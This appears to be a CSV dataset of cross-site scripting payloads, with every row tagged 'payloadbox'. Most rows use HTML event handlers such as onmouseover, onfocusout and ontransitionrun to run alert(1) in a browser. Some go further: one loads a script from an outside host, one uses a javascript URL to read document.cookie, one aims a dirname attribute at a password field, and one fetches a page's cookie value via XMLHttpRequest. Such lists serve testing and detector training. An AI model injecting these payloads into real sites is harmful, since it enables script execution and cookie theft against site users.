text,source
"<sup onmouseover=""alert(1)"">test</sup>",payloadbox
"<marquee onmouseenter=""alert(1)"">test</marquee>",payloadbox
"<bdi onmouseout=""alert(1)"">test</bdi>",payloadbox
"<if expr=""new ActiveXObject('htmlfile').parentWindow.alert(2)""></if>",payloadbox
<del onfocusout=alert(1) tabindex=1 id=x></del><input autofocus>,payloadbox
"<div draggable=""true"" contenteditable>drag me</div><dialog ondragover=alert(1) contenteditable>drop here</dialog>",payloadbox
"<figure oncopy=""alert(1)"" contenteditable>test</figure>",payloadbox
<embed id=x tabindex=1 onactivate=alert(1)></embed>,payloadbox
"<area onbeforecut=""alert(1)"" contenteditable>test</area>",payloadbox
<body onload=alert(1)>,payloadbox
"<tfoot onmousemove=""alert(1)"">test</tfoot>",payloadbox
"<tbody onkeyup=""alert(1)"" contenteditable>test</tbody>",payloadbox
"<dt oncontextmenu=""alert(1)"">test</dt>",payloadbox
"<ruby oncontextmenu=""alert(1)"">test</ruby>",payloadbox
<legend id=x tabindex=1 ondeactivate=alert(1)></legend><input id=y autofocus>,payloadbox
"<style>:target {transform: rotate(180deg);}</style><q id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></q>",payloadbox
"<li onbeforepaste=""alert(1)"" contenteditable>test</li>",payloadbox
"<style>:target {transform: rotate(180deg);}</style><u id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></u>",payloadbox
"<shadow draggable=""true"" ondragenter=""alert(1)"">test</shadow>",payloadbox
"<time onkeydown=""alert(1)"" contenteditable>test</time>",payloadbox
"<template onmousedown=""alert(1)"">test</template>",payloadbox
"<style>:target {color:red;}</style><body id=x style=""transition:color 1s"" ontransitionend=alert(1)></body>",payloadbox
"<rb onbeforecut=""alert(1)"" contenteditable>test</rb>",payloadbox
"<div draggable=""true"" contenteditable>drag me</div><article ondragover=alert(1) contenteditable>drop here</article>",payloadbox
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><col id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></col>",payloadbox
"<code draggable=""true"" ondragstart=""alert(1)"">test</code>",payloadbox
<textarea oninput=alert(1)>XSS</textarea>,payloadbox
"<summary draggable=""true"" ondragleave=""alert(1)"">test</summary>",payloadbox
"<rtc oncopy=""alert(1)"" contenteditable>test</rtc>",payloadbox
<dir onfocusout=alert(1) tabindex=1 id=x></dir><input autofocus>,payloadbox
"<multicol onmouseout=""alert(1)"">test</multicol>",payloadbox
"<tt onbeforecopy=""alert(1)"" contenteditable>test</tt>",payloadbox
"<strong onbeforecut=""alert(1)"" contenteditable>test</strong>",payloadbox
"<source onkeydown=""alert(1)"" contenteditable>test</source>",payloadbox
"<img usemap=#x><map name=""x""><area href onfocus=alert(1) id=x>",payloadbox
"<style>:target {transform: rotate(180deg);}</style><tr id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></tr>",payloadbox
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><output id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></output>",payloadbox
"<div id=""97""><!-- IE 5-9 -->",payloadbox
<image src/onerror=prompt(8)>,payloadbox
"<style>@keyframes slidein {}</style><rp style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></rp>",payloadbox
<s id=x tabindex=1 onactivate=alert(1)></s>,payloadbox
"<div draggable=""true"" contenteditable>drag me</div><button ondragover=alert(1) contenteditable>drop here</button>",payloadbox
"<noscript onbeforepaste=""alert(1)"" contenteditable>test</noscript>",payloadbox
"<blockquote oncut=""alert(1)"" contenteditable>test</blockquote>",payloadbox
<s onfocusout=alert(1) tabindex=1 id=x></s><input autofocus>,payloadbox
"<body draggable=""true"" ondragleave=""alert(1)"">test</body>",payloadbox
"<area ondblclick=""alert(1)"">test</area>",payloadbox
"<h1 onclick=""alert(1)"">test</h1>",payloadbox
"<center draggable=""true"" ondragstart=""alert(1)"">test</center>",payloadbox
"<keygen onkeydown=""alert(1)"" contenteditable>test</keygen>",payloadbox
"<div id=""83""><x:template xmlns:x=""http://www.wapforum.org/2001/wml""  x:ontimer=""$(x:unesc)j$(y:escape)a$(z:noecs)v$(x)a$(y)s$(z)cript$x:alert(83)""><x:timer value=""1""/></x:template>//[""'`-->]]>]</div>",payloadbox
<base onfocusout=alert(1) tabindex=1 id=x></base><input autofocus>,payloadbox
"<! foo=""[[[x]]""><x foo=""]foo><script>alert(91)</script>"">",payloadbox
"<dd onbeforepaste=""alert(1)"" contenteditable>test</dd>",payloadbox
<sup id=x tabindex=1 onbeforedeactivate=alert(1)></sup><input autofocus>,payloadbox
"<dd draggable=""true"" ondragenter=""alert(1)"">test</dd>",payloadbox
<thead id=x tabindex=1 onbeforeactivate=alert(1)></thead>,payloadbox
"<style>:target {color: red;}</style><hr id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></hr>",payloadbox
<svg><aside onload=alert(1)></aside>,payloadbox
"<applet onclick=""alert(1)"">test</applet>",payloadbox
<!--><scRipT src=//14.rs>,payloadbox
feed:javascript:alert('Top Page Location: '+document.location+' Host Page Cookies: '+document.cookie);//<br/><hr/>,payloadbox
"<style>:target {transform: rotate(180deg);}</style><sup id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></sup>",payloadbox
<textarea autofocus onfocus=alert(1)>test</textarea>,payloadbox
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><hgroup id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></hgroup>",payloadbox
<aside onfocusout=alert(1) tabindex=1 id=x></aside><input autofocus>,payloadbox
"<button onmousemove=""alert(1)"">test</button>",payloadbox
<applet id=x tabindex=1 onbeforedeactivate=alert(1)></applet><input autofocus>,payloadbox
"<style>:target {color: red;}</style><slot id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></slot>",payloadbox
"<style>:target {color:red;}</style><menuitem id=x style=""transition:color 1s"" ontransitionend=alert(1)></menuitem>",payloadbox
"<content onclick=""alert(1)"">test</content>",payloadbox
"<p onmouseup=""alert(1)"">test</p>",payloadbox
"<colgroup draggable=""true"" ondragend=""alert(1)"">test</colgroup>",payloadbox
"<div id=d><x xmlns=""><iframe onload=alert(97)""></div>",payloadbox
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><option id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></option>",payloadbox
"<address onmouseleave=""alert(1)"">test</address>",payloadbox
"<div draggable=""true"" contenteditable>drag me</div><script ondragover=alert(1) contenteditable>drop here</script>",payloadbox
"<style>:target {transform: rotate(180deg);}</style><p id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></p>",payloadbox
"<style>:target {color: red;}</style><tfoot id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></tfoot>",payloadbox
<meter onfocusout=alert(1) tabindex=1 id=x></meter><input autofocus>,payloadbox
"<style>@keyframes slidein {}</style><p style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></p>",payloadbox
"<dir onmouseenter=""alert(1)"">test</dir>",payloadbox
<audio id=x tabindex=1 onactivate=alert(1)></audio>,payloadbox
"<style>@keyframes x{}</style><kbd style=""animation-name:x"" onanimationstart=""alert(1)""></kbd>",payloadbox
"<font draggable=""true"" ondragstart=""alert(1)"">test</font>",payloadbox
"<bgsound oncontextmenu=""alert(1)"">test</bgsound>",payloadbox
"<dl draggable=""true"" ondragleave=""alert(1)"">test</dl>",payloadbox
"<small ondblclick=""alert(1)"">test</small>",payloadbox
<--`<img/src=` onerror=alert(1)> --!>,payloadbox
"<p onmouseleave=""alert(1)"">test</p>",payloadbox
<del id=x tabindex=1 onbeforedeactivate=alert(1)></del><input autofocus>,payloadbox
"<spacer draggable=""true"" ondragleave=""alert(1)"">test</spacer>",payloadbox
"<summary onmouseover=""alert(1)"">test</summary>",payloadbox
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><datalist id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></datalist>",payloadbox
<ins id=x tabindex=1 onfocusin=alert(1)></ins>,payloadbox
<th onblur=alert(1) tabindex=1 id=x></th><input autofocus>,payloadbox
"<nav draggable=""true"" ondragenter=""alert(1)"">test</nav>",payloadbox
"<datalist onmouseover=""alert(1)"">test</datalist>",payloadbox
"<div id=""133""><!-- `<img/src=xx:xx onerror=alert(133)//--!>//[""'`-->]]>]</div>",payloadbox
"<style>:target {color: red;}</style><input id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></input>",payloadbox
"<input name=""injected"" value=""injected"" dirname=""password"" />",payloadbox
"<strong onbeforepaste=""alert(1)"" contenteditable>test</strong>",payloadbox
"<div draggable=""true"" contenteditable>drag me</div><image ondragover=alert(1) contenteditable>drop here</image>",payloadbox
"<small onmousedown=""alert(1)"">test</small>",payloadbox
"<style>:target {transform: rotate(180deg);}</style><input id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></input>",payloadbox
"<br oncopy=""alert(1)"" contenteditable>test</br>",payloadbox
"<blockquote onmouseup=""alert(1)"">test</blockquote>",payloadbox
"<dialog onkeypress=""alert(1)"" contenteditable>test</dialog>",payloadbox
<keygen onfocusout=alert(1) tabindex=1 id=x></keygen><input autofocus>,payloadbox
"<dt onbeforepaste=""alert(1)"" contenteditable>test</dt>",payloadbox
"<dfn onmouseenter=""alert(1)"">test</dfn>",payloadbox
"<tbody onmouseenter=""alert(1)"">test</tbody>",payloadbox
<li id=x tabindex=1 onbeforedeactivate=alert(1)></li><input autofocus>,payloadbox
<legend id=x tabindex=1 onactivate=alert(1)></legend>,payloadbox
<dd id=x tabindex=1 onbeforeactivate=alert(1)></dd>,payloadbox
"<section oncut=""alert(1)"" contenteditable>test</section>",payloadbox
"<nextid draggable=""true"" ondragenter=""alert(1)"">test</nextid>",payloadbox
"<td onclick=""alert(1)"">test</td>",payloadbox
"<fieldset onmousemove=""alert(1)"">test</fieldset>",payloadbox
"<div id=""54""><script>[{'a':Object.prototype.__defineSetter__('b',function(){alert(arguments[0])}),'b':['secret']}]</script>//[""'`-->]]>]</div><div id=""55""><video><source onerror=""alert(55)"">//[""'`-->]]>]</div><div id=""56""><video onerror=""alert(56)""><source></source></video>//[""'`-->]]>]</div><div id=""57""><b <script>alert(57)//</script>0</script></b>//[""'`-->]]>]</div><div id=""58""><b><script<b></b><alert(58)</script </b></b>//[""'`-->]]>]</div><div id=""59""><div id=""div1""><input value=""``onmouseover=alert(59)""></div> <div id=""div2""></div><script>document.getElementById(""div2"").innerHTML = document.getElementById(""div1"").innerHTML;</script>//[""'`-->]]>]</div><div id=""60""><div style=""[a]color[b]:[c]red"">XXX</div>//[""'`-->]]>]</div>",payloadbox
<x contenteditable onkeydown=alert(1)>press any key!,payloadbox
<dialog onblur=alert(1) tabindex=1 id=x></dialog><input autofocus>,payloadbox
"<video autoplay controls onvolumechange=alert(1)><source src=""validvideo.mp4"" type=""video/mp4""></video>",payloadbox
"<div draggable=""true"" contenteditable>drag me</div><source ondragover=alert(1) contenteditable>drop here</source>",payloadbox
"<cite draggable=""true"" ondragenter=""alert(1)"">test</cite>",payloadbox
<xss id=x tabindex=1 onfocus=alert(1)></xss>,payloadbox
"<body onbeforecut=""alert(1)"" contenteditable>test</body>",payloadbox
"<div draggable=""true"" contenteditable>drag me</div><frame ondragover=alert(1) contenteditable>drop here</frame>",payloadbox
"<mark onbeforecut=""alert(1)"" contenteditable>test</mark>",payloadbox
"<bgsound draggable=""true"" ondragend=""alert(1)"">test</bgsound>",payloadbox
<dt id=x tabindex=1 onfocus=alert(1)></dt>,payloadbox
"<div draggable=""true"" contenteditable>drag me</div><map ondrop=alert(1) contenteditable>drop here</map>",payloadbox
"<label onbeforepaste=""alert(1)"" contenteditable>test</label>",payloadbox
<textarea onchange=alert(1)>XSS</textarea>,payloadbox
"<ruby onbeforecut=""alert(1)"" contenteditable>test</ruby>",payloadbox
"<style>:target {color: red;}</style><summary id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></summary>",payloadbox
<meta id=x tabindex=1 onbeforeactivate=alert(1)></meta>,payloadbox
"<em onmouseenter=""alert(1)"">test</em>",payloadbox
<tr onfocusout=alert(1) tabindex=1 id=x></tr><input autofocus>,payloadbox
<dialog id=x tabindex=1 ondeactivate=alert(1)></dialog><input id=y autofocus>,payloadbox
<cite onfocusout=alert(1) tabindex=1 id=x></cite><input autofocus>,payloadbox
"<frameset onkeydown=""alert(1)"" contenteditable>test</frameset>",payloadbox
"<strike draggable=""true"" ondragend=""alert(1)"">test</strike>",payloadbox
<nextid id=x tabindex=1 onbeforeactivate=alert(1)></nextid>,payloadbox
<svg><option onload=alert(1)></option>,payloadbox
"<option onkeypress=""alert(1)"" contenteditable>test</option>",payloadbox
"<style>@keyframes slidein {}</style><script style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></script>",payloadbox
"<div draggable=""true"" contenteditable>drag me</div><var ondragover=alert(1) contenteditable>drop here</var>",payloadbox
"<col onmouseenter=""alert(1)"">test</col>",payloadbox
<svg id=x tabindex=1 ondeactivate=alert(1)></svg><input id=y autofocus>,payloadbox
"<s oncontextmenu=""alert(1)"">test</s>",payloadbox
"<del onkeypress=""alert(1)"" contenteditable>test</del>",payloadbox
"<big ondblclick=""alert(1)"">test</big>",payloadbox
"<bgsound ondblclick=""alert(1)"">test</bgsound>",payloadbox
<body onmessage=alert(1)>,payloadbox
"<style>:target {color: red;}</style><abbr id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></abbr>",payloadbox
"<sup onmouseenter=""alert(1)"">test</sup>",payloadbox
<header id=x tabindex=1 onfocusin=alert(1)></header>,payloadbox
"<rb onkeydown=""alert(1)"" contenteditable>test</rb>",payloadbox
"<noembed onmouseleave=""alert(1)"">test</noembed>",payloadbox
"<style>:target {color:red;}</style><picture id=x style=""transition:color 1s"" ontransitionend=alert(1)></picture>",payloadbox
<shadow id=x tabindex=1 onfocus=alert(1)></shadow>,payloadbox
"<link onmouseover=""alert(1)"">test</link>",payloadbox
"<s onkeydown=""alert(1)"" contenteditable>test</s>",payloadbox
"<div draggable=""true"" contenteditable>drag me</div><b ondrop=alert(1) contenteditable>drop here</b>",payloadbox
"<keygen ondblclick=""alert(1)"">test</keygen>",payloadbox
<shadow id=x tabindex=1 onbeforeactivate=alert(1)></shadow>,payloadbox
"</svg>//[""'`-->]]>]</div>",payloadbox
<q id=x tabindex=1 onbeforeactivate=alert(1)></q>,payloadbox
"<nextid onmousedown=""alert(1)"">test</nextid>",payloadbox
"<marquee onpaste=""alert(1)"" contenteditable>test</marquee>",payloadbox
<dt onblur=alert(1) tabindex=1 id=x></dt><input autofocus>,payloadbox
<mark id=x tabindex=1 ondeactivate=alert(1)></mark><input id=y autofocus>,payloadbox
"<picture><source srcset=""validimage.png""><img onloadend=alert(1)></picture>",payloadbox
"<small onmouseout=""alert(1)"">test</small>",payloadbox
<img srcset=validimage.png onload=alert(1)>,payloadbox
<iframe src=javascript:alert(1)>,payloadbox
<tfoot id=x tabindex=1 onbeforedeactivate=alert(1)></tfoot><input autofocus>,payloadbox
"<legend onmouseout=""alert(1)"">test</legend>",payloadbox
"<u onmousedown=""alert(1)"">test</u>",payloadbox
"<style>@keyframes slidein {}</style><footer style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></footer>",payloadbox
<wbr id=x tabindex=1 onbeforedeactivate=alert(1)></wbr><input autofocus>,payloadbox
<hr id=x tabindex=1 onbeforedeactivate=alert(1)></hr><input autofocus>,payloadbox
"<element onbeforecopy=""alert(1)"" contenteditable>test</element>",payloadbox
"<style>@keyframes x{}</style><menu style=""animation-name:x"" onanimationstart=""alert(1)""></menu>",payloadbox
"<ruby onmouseout=""alert(1)"">test</ruby>",payloadbox
<html ontouchend=alert(1)>,payloadbox
"<style>:target {transform: rotate(180deg);}</style><thead id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></thead>",payloadbox
"<style>@keyframes x{}</style><frame style=""animation-name:x"" onanimationend=""alert(1)""></frame>",payloadbox
<blockquote onblur=alert(1) tabindex=1 id=x></blockquote><input autofocus>,payloadbox
"<nobr onmouseenter=""alert(1)"">test</nobr>",payloadbox
"<command onbeforecopy=""alert(1)"" contenteditable>test</command>",payloadbox
"<th oncut=""alert(1)"" contenteditable>test</th>",payloadbox
"<footer onmouseenter=""alert(1)"">test</footer>",payloadbox
"<fieldset onkeyup=""alert(1)"" contenteditable>test</fieldset>",payloadbox
"<div draggable=""true"" contenteditable>drag me</div><frameset ondragover=alert(1) contenteditable>drop here</frameset>",payloadbox
"<script>var x = document.createElement('iframe');document.body.appendChild(x);var xhr = x.contentWindow.XMLHttpRequest();xhr.open('GET', 'http://xssme.html5sec.org/xssme2', true);xhr.onload = function() { alert(xhr.responseText.match(/cookie = '(.*?)'/)[1]) };xhr.send();</script>",payloadbox
